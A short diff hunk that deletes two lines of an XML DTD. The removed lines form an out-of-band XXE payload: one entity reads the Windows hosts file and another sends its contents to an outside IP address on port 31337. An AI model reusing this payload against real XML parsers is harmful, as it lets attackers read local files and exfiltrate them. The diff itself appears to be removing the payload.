@@ -1,2 +1,0 @@
-<!ENTITY % d SYSTEM “file:///c:\Windows\System32\Drivers\etc\hosts”>
-<!ENTITY % c “<!ENTITY rrr SYSTEM ‘http://157.230.49.13:31337/%d;'>">
